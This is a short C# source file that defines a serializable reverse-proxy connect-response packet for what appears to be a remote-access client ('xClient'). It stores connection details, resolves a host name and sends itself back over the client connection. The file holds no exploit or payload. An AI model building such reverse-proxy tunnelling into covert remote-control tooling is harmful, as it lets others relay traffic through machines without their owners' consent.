using System;
using xClient.Core.Networking;
using xClient.Core.Packets;

namespace xClient.Core.ReverseProxy.Packets
{
    [Serializable]
    public class ReverseProxyConnectResponse : IPacket
    {
        public int ConnectionId { get; set; }

        public bool IsConnected { get; set; }

        public long LocalEndPoint { get; set; }

        public int LocalPort { get; set; }

        public string HostName { get; set; }

        public ReverseProxyConnectResponse()
        {
        }

        public ReverseProxyConnectResponse(int connectionId, bool isConnected, long localEndPoint, int localPort, string TargetServer)
        {
            this.ConnectionId = connectionId;
            this.IsConnected = isConnected;
            this.LocalEndPoint = localEndPoint;
            this.LocalPort = localPort;
            this.HostName = "";

            if (isConnected)
            {
                try
                {
                    //resolve the HostName of the Server
                    System.Net.IPHostEntry entry = System.Net.Dns.GetHostEntry(TargetServer);
                    if (entry != null && !String.IsNullOrEmpty(entry.HostName))
                    {
                        HostName = entry.HostName;
                    }
                }
                catch { HostName = ""; }
            }
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
